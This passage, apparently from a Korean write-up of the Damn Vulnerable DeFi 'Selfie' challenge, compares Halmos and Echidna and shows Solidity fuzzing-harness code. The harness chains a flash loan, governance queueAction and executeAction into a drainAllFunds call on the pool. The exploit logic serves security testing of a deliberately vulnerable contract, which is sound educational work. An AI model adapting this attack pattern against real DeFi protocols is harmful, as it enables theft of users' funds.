[Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster#echidna)의 프랑켄슈타인과 약간 비슷하지 않나요? 다시 한 번 말씀드리지만, `executeAction` 내부에서 실행될 수 있는 단 2개의 함수만 여기서 고려되었으며, 함수는 이미 매우 거대합니다. 그리고 이러한 함수의 매개변수는 추상적이지 않고 하드코딩되어 있습니다. 이러한 배경에서 Halmos의 사용 편의성은 명백합니다.
### 액션 호출
설정이 완료되면 퍼저는 이 모든 함수를 실행할 수 있는 능력을 갖게 됩니다. `receiveTokens()`에는 이를 위한 기능이 있습니다:
```solidity
...
 function receiveTokens(address, uint256 _amount) external {
    require(
        msg.sender == address(pool),
        "Only SelfiePool can call this function."
    );
    // 로직
    callbackActions();
    // 대출 상환
    require(token.transfer(address(pool), _amount), "Flash loan failed");
}
...
function callbackActions() internal {
    uint256 genArrLength = callbackActionsToBeCalled.length;
    if (genArrLength != 0) {
        for (uint256 i; i < genArrLength; i++) {
            callAction(callbackActionsToBeCalled[i]);
        }
    } else {
        revert("actionsToBeCalled is empty, no action called");
    }
}
...
function callAction(uint256 _num) internal {
    // 모든 자금 배출
    if (_num == uint256(CallbackActions.drainAllFunds)) {
        drainAllFunds();
    }
    // 자금 전송
    if (_num == uint256(CallbackActions.transferFrom)) {
        callbackTransferFrom();
    }
    // 액션 대기열 추가
    if (_num == uint256(CallbackActions.queueAction)) {
        callQueueAction();
        ++payloadsQueuedCounter;
    }
    // 액션 실행
    if (_num == uint256(CallbackActions.executeAction)) {
        try this.executeAction() {} catch {
            revert("queueAction unsuccessful");
        }
    }
}
```
그리고 실제로, `callAction` 내부에서 실행되는 함수들입니다.
```solidity
...
function drainAllFunds() public {
    pool.drainAllFunds(address(this));
}
...
function callbackTransferFrom() internal {
    // 전송할 토큰 금액 가져오기
    uint256 _amount = _transferAmountInCallback[
        _transferAmountInCallbackCounter
    ];
    // 카운터 증가
    ++_transferAmountInCallbackCounter;
    // 전송 함수 호출
    transferFrom(_amount);
}
...
function callQueueAction() internal {
    // 이미 대기 중인 액션 카운터의 현재 값 캐시
    uint256 counter = payloadsQueuedCounter;
    // 현재 카운터를 기반으로 queueAction 매개변수 (자세한 내용은 SimpleGovernance:SimpleGovernance 참조) 가져오기
    // 1: weiAmount
    uint256 _weiAmount = payloads[counter].weiAmount;
    require(
        address(this).balance >= _weiAmount,
        "Not sufficient account balance to queue an action"
    );
    // 2: 수신자 주소
    address _receiver = payloads[counter].receiver;
    // 3: 페이로드
    bytes memory _payload = payloads[counter].payload;
    // queueAction() 호출
    queueAction(_receiver, _payload, _weiAmount);
}
...
function executeAction() public {
    // 첫 번째 실행되지 않은 actionId 가져오기
    uint256 actionId = actionIds[actionIdCounter];
    // action Id 카운터 증가
    actionIdCounter = actionIdCounter + 1;
    // 실행될 액션과 관련된 데이터 가져오기
    (, , uint256 weiAmount, uint256 proposedAt, ) = governance.actions(
        actionId
    );
    require(
        address(this).balance >= weiAmount,
        "Not sufficient account balance to execute the action"
    );
    require(
        block.timestamp >= proposedAt + ACTION_DELAY_IN_SECONDS,
        "Time for action execution has not passed yet"
    );
    // 액션
    governance.executeAction{value: weiAmount}(actionId);
    // 실행된 페이로드 카운터 증가
    ++payloadsExecutedCounter;
}
```
`flashLoan()` 및 `executeAction()` 실행은 여기서 발생합니다:
```solidity
...
function flashLoan() public {
    // 최대 토큰 금액 대출
    uint256 borrowAmount = token.balanceOf(address(pool));
    pool.flashLoan(borrowAmount);
}
...
function executeAction() public {
    // 첫 번째 실행되지 않은 actionId 가져오기
    uint256 actionId = actionIds[actionIdCounter];
    // action Id 카운터 증가
    actionIdCounter = actionIdCounter + 1;
    // 실행될 액션과 관련된 데이터 가져오기
    (, , uint256 weiAmount, uint256 proposedAt, ) = governance.actions(
        actionId
    );
    require(
        address(this).balance >= weiAmount,
        "Not sufficient account balance to execute the action"
    );
    require(
        block.timestamp >= proposedAt + ACTION_DELAY_IN_SECONDS,
        "Time for action execution has not passed yet"
    );
    // 액션
    governance.executeAction{value: weiAmount}(actionId);
    // 실행된 페이로드 카운터 증가
    ++payloadsExecutedCounter;
}
```

결과적으로 Echidna는 공격이 시작될 때 불변 조건이 깨지는 설정 함수 세트를 찾아야 합니다.

제가 일부 세부 사항을 놓쳤지만, 전체 솔루션을 직접 읽어보시는 것을 권장합니다.
## 결론
1. 불변 테스트를 준비할 때, 가장 예상치 못한 변수나 상태조차 불변 조건으로 사용하여 훌륭한 버그를 찾을 수 있습니다. 가능한 모든 것을 의심하십시오!
2. 퍼징은 `flashLoan`을 처리하는 데 정말 능숙합니다. 하지만 함수 호출을 추상화할 때, Echidna는 Halmos에 비해 어려움을 겪습니다. 이런 경우에는 Halmos가 훨씬 더 선호됩니다.
3. Halmos vs Echidna 대결에서 Halmos는 설정의 편리함과 추상적 호출 처리 능력 때문에 승리합니다. 하지만 Echidna 역시 적절한 힌트와 설정이 주어진다면 강력한 도구가 될 수 있습니다.
## 다음 단계는?
다음 챌린지는 [Compromised](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/compromised)입니다.
